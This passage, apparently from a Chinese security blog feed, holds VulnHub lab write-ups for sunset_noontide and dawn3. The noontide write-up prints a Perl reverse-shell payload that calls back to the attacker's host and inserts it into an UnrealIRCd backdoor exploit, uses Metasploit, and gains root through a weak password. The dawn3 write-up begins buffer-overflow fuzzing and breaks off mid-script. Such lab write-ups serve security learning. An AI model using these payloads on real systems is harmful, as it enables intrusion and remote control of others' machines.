href="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/01.%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/1.%E8%B5%84%E4%BA%A7%E6%94%B6%E9%9B%86/03.ip%E6%AE%B5%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/07.%E7%AB%AF%E5%8F%A3%E5%AF%B9%E5%BA%94%E6%B8%97%E9%80%8F%EF%BC%88%E7%AB%AF%E5%8F%A3%E6%B8%97%E9%80%8F%E5%A4%87%E5%BF%98%E5%BD%95%EF%BC%89">07.端口对应渗透（端口渗透备忘录） · d4m1ts 知识库 (gm7.org)</a></p><p>offsec 有视频讲解： <a href="https://www.youtube.com/watch?v=NQ6jbKqkJ0s&t=5s">Solstice VM - Walkthrough with S1REN. - YouTube</a></p>]]></content>
    
    
    <categories>
      
      <category>knowledge_database</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>sunset_noontide 靶机</title>
    <link href="/2023/10/125a16ce3195.html"/>
    <url>/2023/10/125a16ce3195.html</url>
    
    <content type="html"><![CDATA[<h1 id="sunset-noontide"><a href="#sunset-noontide" class="headerlink" title="sunset_noontide"></a>sunset_noontide</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Documents/sunset_noontide]<br>└─$ sudo nmap --min-rate 10000 -p- 192.168.56.150<br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-09 05:25 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.150<br>Host is up (0.00034s latency).<br>Not shown: 65532 closed tcp ports (reset)<br>PORT     STATE SERVICE<br>6667/tcp open  irc<br>6697/tcp open  ircs-u<br>8067/tcp open  infi-async<br>MAC Address: 08:00:27:91:A9:5B (Oracle VirtualBox virtual NIC)<br></code></pre></td></tr></table></figure><p>开了三个不太熟悉的端口</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Documents/sunset_noontide]<br>└─$ sudo nmap -sT -sV -sC -O -p6667,6697,8067 192.168.56.150<br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-09 05:26 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.150<br>Host is up (0.00083s latency).<br><br>PORT     STATE SERVICE VERSION<br>6667/tcp open  irc     UnrealIRCd<br>6697/tcp open  irc     UnrealIRCd<br>8067/tcp open  irc     UnrealIRCd<br>MAC Address: 08:00:27:91:A9:5B (Oracle VirtualBox virtual NIC)<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Aggressive OS guesses: Linux 3.5 (97%), Linux 3.1 (95%), Linux 3.2 (95%), Check Point VPN-1 UTM appliance (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), Netgear GS700T- or XS700T-series switch (94%), Linux 2.6.32 (93%), Linux 3.2 - 4.9 (93%), Linux 4.15 - 5.8 (93%), Netgear ReadyNAS 2100 (RAIDiator 4.2.24) (93%)<br>No exact OS matches <span class="hljs-keyword">for</span> host (<span class="hljs-built_in">test</span> conditions non-ideal).<br>Network Distance: 1 hop<br>Service Info: Host: irc.foonet.com<br></code></pre></td></tr></table></figure><p>irc 服务不太了解，不过还是把流程走完吧</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Documents/sunset_noontide]<br>└─$ sudo nmap --script=vuln -p6667,6697,8067 192.168.56.150 <br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-09 05:27 EDT<br>Pre-scan script results:<br>| broadcast-avahi-dos: <br>|   Discovered hosts:<br>|     224.0.0.251<br>|   After NULL UDP avahi packet DoS (CVE-2011-1002).<br>|_  Hosts are all up (not vulnerable).<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.150<br>Host is up (0.00033s latency).<br><br>PORT     STATE SERVICE<br>6667/tcp open  irc<br>6697/tcp open  ircs-u<br>| irc-botnet-channels: <br>|_  ERROR: Closing Link: [192.168.56.106] (Too many unknown connections from your IP)<br>|_ssl-ccs-injection: No reply from server (TIMEOUT)<br>8067/tcp open  infi-async<br>| irc-botnet-channels: <br>|_  ERROR: Closing Link: [192.168.56.106] (Too many unknown connections from your IP)<br>MAC Address: 08:00:27:91:A9:5B (Oracle VirtualBox virtual NIC)<br></code></pre></td></tr></table></figure><h2 id="IRC-渗透"><a href="#IRC-渗透" class="headerlink" title="IRC 渗透"></a>IRC 渗透</h2><p>那就只能从 irc 着手了，查到了一些相关资料</p><p><img src="/pic/40213028a320339d58cc4ae6d0aa91b0_MD5.png"></p><p><a href="https://github.com/Yehnn/kali/blob/master/kali%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%94%BB%E5%87%BB/11%E6%94%BB%E5%87%BB%20Unreal%20Ircd%20%E6%9C%8D%E5%8A%A1.md">kali&#x2F;kali服务器攻击&#x2F;11攻击 Unreal Ircd 服务.md at master · Yehnn&#x2F;kali (github.com)</a></p><p>大部分都是直接使用 msf 的</p><p><img src="/pic/62fca7764f5809837714c73f7a907ea5_MD5.png"></p><p>不使用 msf 的话，exp 中的 pl 脚本直接运行有问题。需要自己手动修改一下，替换为自己的 payload，这个技巧也在刚才链接的博客里有提到</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Documents/sunset_noontide]<br>└─$ msfvenom -p cmd/unix/reverse_perl LHOST=192.168.56.106 LPORT=443 -f raw<br>[-] No platform was selected, choosing Msf::Module::Platform::Unix from the payload<br>[-] No <span class="hljs-built_in">arch</span> selected, selecting <span class="hljs-built_in">arch</span>: cmd from the payload<br>No encoder specified, outputting raw payload<br>Payload size: 232 bytes<br>perl -MIO -e <span class="hljs-string">&#x27;$p=fork;exit,if($p);foreach my $key(keys %ENV)&#123;if($ENV&#123;$key&#125;=~/(.*)/)&#123;$ENV&#123;$key&#125;=$1;&#125;&#125;$c=new IO::Socket::INET(PeerAddr,&quot;192.168.56.106:443&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);while(&lt;&gt;)&#123;if($_=~ /(.*)/)&#123;system $1;&#125;&#125;;&#x27;</span><br></code></pre></td></tr></table></figure><p>接下来我们要观察原来 payload 的结构，看看如何将自己的 payload 加进去。首先是 payload 开头都有 <code>AB;</code> 这应该是必要的代码，接下来要注意引号问题，这里我们将生成的代码中的单引号用反斜线转义</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">my <span class="hljs-variable">$payload1</span> = <span class="hljs-string">&#x27;AB; perl -MIO -e \&#x27;</span><span class="hljs-variable">$p</span>=fork;<span class="hljs-built_in">exit</span>,<span class="hljs-keyword">if</span>(<span class="hljs-variable">$p</span>);foreach my <span class="hljs-variable">$key</span>(keys %ENV)&#123;<span class="hljs-keyword">if</span>(<span class="hljs-variable">$ENV</span>&#123;<span class="hljs-variable">$key</span>&#125;=~/(.*)/)&#123;<span class="hljs-variable">$ENV</span>&#123;<span class="hljs-variable">$key</span>&#125;=<span class="hljs-variable">$1</span>;&#125;&#125;<span class="hljs-variable">$c</span>=new IO::Socket::INET(PeerAddr,<span class="hljs-string">&quot;192.168.56.106:443&quot;</span>);STDIN-&gt;fdopen(<span class="hljs-variable">$c</span>,r);$~-&gt;fdopen(<span class="hljs-variable">$c</span>,w);<span class="hljs-keyword">while</span>(&lt;&gt;)&#123;<span class="hljs-keyword">if</span>(<span class="hljs-variable">$_</span>=~ /(.*)/)&#123;system <span class="hljs-variable">$1</span>;&#125;&#125;;\<span class="hljs-string">&#x27;&#x27;</span>;<br></code></pre></td></tr></table></figure><p>亲测可以反弹 shell。用 msf 也试一下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) &gt; <span class="hljs-built_in">set</span> RHOSTS 192.168.56.150<br>RHOSTS =&gt; 192.168.56.150<br>msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) &gt; <span class="hljs-built_in">set</span> RPORT 6697<br>RPORT =&gt; 6697<br>msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) &gt; run<br><br>[-] 192.168.56.150:6697 - Exploit failed: A payload has not been selected.<br>[*] Exploit completed, but no session was created.<br></code></pre></td></tr></table></figure><p>可以使用 <code>show payloads</code> 查看可用的 paylaod，我按照刚才链接的那篇文章中的方法，设置 payload 为 <code>cmd/unix/reverse_perl</code> ，并设置了LHOST</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs bash">msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) &gt; <span class="hljs-built_in">set</span> payload cmd/unix/reverse_perl<br>payload =&gt; cmd/unix/reverse_perl<br>msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) &gt; <span class="hljs-built_in">set</span> LHOST 192.168.56.106<br>LHOST =&gt; 192.168.56.106<br>msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) &gt; run<br><br>[*] Started reverse TCP handler on 192.168.56.106:4444 <br>[*] 192.168.56.150:6667 - Connected to 192.168.56.150:6667...<br>    :irc.foonet.com NOTICE AUTH :*** Looking up your hostname...<br>    :irc.foonet.com NOTICE AUTH :*** Couldn\<span class="hljs-string">&#x27;t resolve your hostname; using your IP address instead</span><br><span class="hljs-string">[*] 192.168.56.150:6667 - Sending backdoor command...</span><br><span class="hljs-string">   </span><br><span class="hljs-string">[*] Command shell session 1 opened (192.168.56.106:4444 -&gt; 192.168.56.150:51882) at 2023-10-09 07:31:46 -0400</span><br><span class="hljs-string"></span><br><span class="hljs-string">whoami</span><br><span class="hljs-string">server</span><br><span class="hljs-string">id</span><br><span class="hljs-string">uid=1000(server) gid=1000(server) groups=1000(server),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth)</span><br><span class="hljs-string">uname -a</span><br><span class="hljs-string">Linux noontide 4.19.0-10-amd64 #1 SMP Debian 4.19.132-1 (2020-07-24) x86_64 GNU/Linux</span><br><span class="hljs-string">ip a</span><br><span class="hljs-string">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000</span><br><span class="hljs-string">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class="hljs-string">    inet 127.0.0.1/8 scope host lo</span><br><span class="hljs-string">       valid_lft forever preferred_lft forever</span><br><span class="hljs-string">    inet6 ::1/128 scope host </span><br><span class="hljs-string">       valid_lft forever preferred_lft forever</span><br><span class="hljs-string">2: enp0s3: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP group default qlen 1000</span><br><span class="hljs-string">    link/ether 08:00:27:91:a9:5b brd ff:ff:ff:ff:ff:ff</span><br><span class="hljs-string">    inet 192.168.56.150/24 brd 192.168.56.255 scope global dynamic enp0s3</span><br><span class="hljs-string">       valid_lft 595sec preferred_lft 595sec</span><br><span class="hljs-string">    inet6 fe80::a00:27ff:fe91:a95b/64 scope link </span><br><span class="hljs-string">       valid_lft forever preferred_lft forever</span><br><span class="hljs-string">which python2</span><br><span class="hljs-string">which python3</span><br><span class="hljs-string">/usr/bin/python3</span><br><span class="hljs-string">python3 -c &quot;import pty;pty.spawn(&#x27;</span>/bin/bash<span class="hljs-string">&#x27;)&quot;</span><br><span class="hljs-string">server@noontide:~/irc/Unreal3.2$</span><br><span class="hljs-string">server@noontide:~/irc$ cd ..</span><br><span class="hljs-string">cd ..</span><br><span class="hljs-string">server@noontide:~$ ls</span><br><span class="hljs-string">ls</span><br><span class="hljs-string">irc  local.txt</span><br><span class="hljs-string">server@noontide:~$ cat local.txt</span><br><span class="hljs-string">cat local.txt</span><br><span class="hljs-string">c53c08b5bf2b0801c5d0c24149826a6e</span><br></code></pre></td></tr></table></figure><p>也可以使用下面的 Python 脚本来 Getshell，记得替换脚本中的LHOST</p><p><a href="https://github.com/Ranger11Danger/UnrealIRCd-3.2.8.1-Backdoor">Ranger11Danger&#x2F;UnrealIRCd-3.2.8.1-Backdoor: My backdoor script for a vulnerable version of UnrealIRCd (github.com)</a></p><p>提权部分卡了好大一会，尝试了敏感文件、定时文件、SUID 文件、shadow 文件权限、Linpeas 收集信息</p><h2 id="弱密码提权"><a href="#弱密码提权" class="headerlink" title="弱密码提权"></a>弱密码提权</h2><p>没想到，竟然直接 root 弱密码，没绷住</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs bash">server@noontide:~/irc/Unreal3.2$ su<br>su<br>Password: root<br><br>root@noontide:/home/server/irc/Unreal3.2<span class="hljs-comment"># cd /root</span><br><span class="hljs-built_in">cd</span> /root<br>root@noontide:~<span class="hljs-comment"># ls </span><br><span class="hljs-built_in">ls</span><br>proof.txt<br>root@noontide:~<span class="hljs-comment"># cat proof.txt</span><br><span class="hljs-built_in">cat</span> proof.txt<br>ab28c8ca8da1b9ffc2d702ac54221105<br><br>Thanks <span class="hljs-keyword">for</span> playing! - Felipe Winsnes (@whitecr0wz)<br>root@noontide:~<span class="hljs-comment"># ip a</span><br>ip a<br>1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000<br>    <span class="hljs-built_in">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00<br>    inet 127.0.0.1/8 scope host lo<br>       valid_lft forever preferred_lft forever<br>    inet6 ::1/128 scope host <br>       valid_lft forever preferred_lft forever<br>2: enp0s3: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP group default qlen 1000<br>    <span class="hljs-built_in">link</span>/ether 08:00:27:91:a9:5b brd ff:ff:ff:ff:ff:ff<br>    inet 192.168.56.150/24 brd 192.168.56.255 scope global dynamic enp0s3<br>       valid_lft 595sec preferred_lft 595sec<br>    inet6 fe80::a00:27ff:fe91:a95b/64 scope <span class="hljs-built_in">link</span> <br>       valid_lft forever preferred_lft forever<br>root@noontide:~<span class="hljs-comment"># uname -a</span><br><span class="hljs-built_in">uname</span> -a<br>Linux noontide 4.19.0-10-amd64 <span class="hljs-comment">#1 SMP Debian 4.19.132-1 (2020-07-24) x86_64 GNU/Linux</span><br>root@noontide:~<span class="hljs-comment"># id</span><br><span class="hljs-built_in">id</span><br>uid=0(root) gid=0(root) <span class="hljs-built_in">groups</span>=0(root)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>knowledge_database</category>
      
      <category>vulnhub</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>dawn3 靶机</title>
    <link href="/2023/10/4a11524f2c39.html"/>
    <url>/2023/10/4a11524f2c39.html</url>
    
    <content type="html"><![CDATA[<h1 id="dawn3-靶机"><a href="#dawn3-靶机" class="headerlink" title="dawn3 靶机"></a>dawn3 靶机</h1><p>这台靶机本质上和 Brainpan1 是基本一致的，无论是利用手法，还是思路，基本一样，属于缓冲区溢出漏洞的经典例子，建议结合红队笔记对于 Brainpan1的讲解仔细消化。</p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/dawn3]<br>└─$ sudo nmap --min-rate 10000 -p- 192.168.56.148<br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-09 01:27 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.148<br>Host is up (0.00036s latency).<br>Not shown: 65533 closed tcp ports (reset)<br>PORT     STATE    SERVICE<br>2100/tcp open     amiganetfs<br>6812/tcp filtered unknown<br>MAC Address: 08:00:27:06:69:F3 (Oracle VirtualBox virtual NIC)<br></code></pre></td></tr></table></figure><p>开放了 2100, 6812 端口</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/dawn3]<br>└─$ sudo nmap -sT -sV -sC -O -p2100,6812 192.168.56.148<br>[sudo] password <span class="hljs-keyword">for</span> kali: <br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-09 03:45 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.148<br>Host is up (0.00032s latency).<br><br>PORT     STATE SERVICE VERSION<br>2100/tcp open  ftp     pyftpdlib 1.5.6<br>| ftp-syst: <br>|   STAT: <br>| FTP server status:<br>|  Connected to: 192.168.56.148:2100<br>|  Waiting <span class="hljs-keyword">for</span> username.<br>|  TYPE: ASCII; STRUcture: File; MODE: Stream<br>|  Data connection closed.<br>|_End of status.<br>| ftp-anon: Anonymous FTP login allowed (FTP code 230)<br>|_-rwsrwxrwx   1 dawn3    dawn3      292728 Mar 08  2020 dawn3.exe [NSE: writeable]<br>6812/tcp open  unknown<br>MAC Address: 08:00:27:06:69:F3 (Oracle VirtualBox virtual NIC)<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Device <span class="hljs-built_in">type</span>: general purpose<br>Running: Linux 4.X|5.X<br>OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5<br>OS details: Linux 4.15 - 5.8<br>Network Distance: 1 hop<br></code></pre></td></tr></table></figure><p>FTP 可匿名登录，操作系统是 Linux ，寻找敏感文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/dawn3]<br>└─$ ftp 192.168.56.148 2100<br>Connected to 192.168.56.148.<br>220 pyftpdlib 1.5.6 ready.<br>Name (192.168.56.148:kali): anonymous<br>331 Username ok, send password.<br>Password: <br>230 Login successful.<br>Remote system <span class="hljs-built_in">type</span> is UNIX.<br>Using binary mode to transfer files.<br>ftp&gt; binary<br>200 Type <span class="hljs-built_in">set</span> to: Binary.<br>ftp&gt; <span class="hljs-built_in">ls</span><br>229 Entering extended passive mode (|||44611|).<br>125 Data connection already open. Transfer starting.<br>-rwsrwxrwx   1 dawn3    dawn3      292728 Mar 08  2020 dawn3.exe<br>226 Transfer complete.<br></code></pre></td></tr></table></figure><p>发现了一个 exe 文件，下载到本地查看</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/dawn3]<br>└─$ file dawn3.exe         <br>dawn3.exe: PE32 executable (console) Intel 80386, <span class="hljs-keyword">for</span> MS Windows, 15 sections<br></code></pre></td></tr></table></figure><p>32 位 Windows 操作系统的可执行文件格式，控制台应用程序，x86 架构。</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">┌──(kali㉿kali)-[~/Downloads/dawn3]<br>└─$ binwalk dawn3.exe   <br><br><span class="hljs-type">DECIMAL</span>       HEXADECIMAL     DESCRIPTION<br><span class="hljs-comment">--------------------------------------------------------------------------------</span><br><span class="hljs-number">0</span>             <span class="hljs-number">0x0</span>             Microsoft executable, portable (PE)<br><span class="hljs-number">10995</span>         <span class="hljs-number">0x2AF3</span>          mcrypt <span class="hljs-number">2.5</span> <span class="hljs-keyword">encrypted</span> data, algorithm: &quot;nitializeCriticalSection&quot;, keysize: <span class="hljs-number">973</span> bytes, mode: &quot;L&quot;,<br><span class="hljs-number">257837</span>        <span class="hljs-number">0x3EF2D</span>         mcrypt <span class="hljs-number">2.2</span> <span class="hljs-keyword">encrypted</span> data, algorithm: blowfish<span class="hljs-number">-448</span>, mode: CBC, keymode: MD5 hash<br><span class="hljs-number">257932</span>        <span class="hljs-number">0x3EF8C</span>         mcrypt <span class="hljs-number">2.2</span> <span class="hljs-keyword">encrypted</span> data, algorithm: blowfish<span class="hljs-number">-448</span>, mode: CBC, keymode: <span class="hljs-number">4</span>bit<br></code></pre></td></tr></table></figure><p>程序应该问题不大，不过还是建议在虚拟机里运行，而且测试发现 win11 上运行该程序可能会有异常，之后是在 Windows7 上运行测试的</p><h2 id="缓冲区溢出漏洞"><a href="#缓冲区溢出漏洞" class="headerlink" title="缓冲区溢出漏洞"></a>缓冲区溢出漏洞</h2><p>strings 查看可读字符</p><p><img src="/pic/003c0f87f77c606de8e66a74d09d199b_MD5.png"></p><p>对于输入的参数，没有过滤，可能存在缓冲区溢出漏洞。这里尝试了一下 200 字符作为输入</p><p><img src="/pic/638c8081997047cd8c6131f7421c622e_MD5.png"></p><p>会直接打印，那接下来手动进行测试</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">python2 -c <span class="hljs-string">&#x27;print &quot;A&quot;*500&#x27;</span><br><br>python2 -c <span class="hljs-string">&#x27;print &quot;A&quot;*600&#x27;</span><br><br>telnet 192.1.1.155 6812<br></code></pre></td></tr></table></figure><p><img src="/pic/5ff4ca36b793b6999b1012c77f3916e4_MD5.png"></p><p>输入 600 字符时，程序崩溃</p><p><img src="/pic/bdf598f6c9eac896380ff58e13f0de41_MD5.png"></p><p>使用 Brianpan1 靶机的脚本，略微修改一下来测试此程序。前面我们已经确定了 600 个字符时，程序崩溃，接下来我们要确定在哪一个字节的位置出现了缓冲区溢出。我们需要使用 Immunity Debugger 工具来进行操作，同时需要安装 mona 插件，在谷歌上搜就行。</p><p>使用该工具打开目标 exe，刚开始只是加载，右下角显示状态是 pause，当我们点击运行的时候，才会真正运行，右下角的状态变为Running</p><p><img src="/pic/7f1df6885bcc5208b9bcd8f4c7cbcff1_MD5.png"></p><p>同时生成方便定位的 600 个字符</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/dawn3]<br>└─$ msf-pattern_create -l 600<br>Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9<br></code></pre></td></tr></table></figure><p>脚本来自 B 站 UP 红队笔记的视频中出现的代码：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/usr/bin/python</span><br>import socket<br>import time<br>import sys<br><br>size = 100<br><br>try:<br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;\n[+] Send evil buffer so many bytes&quot;</span><br>        buffer = <span 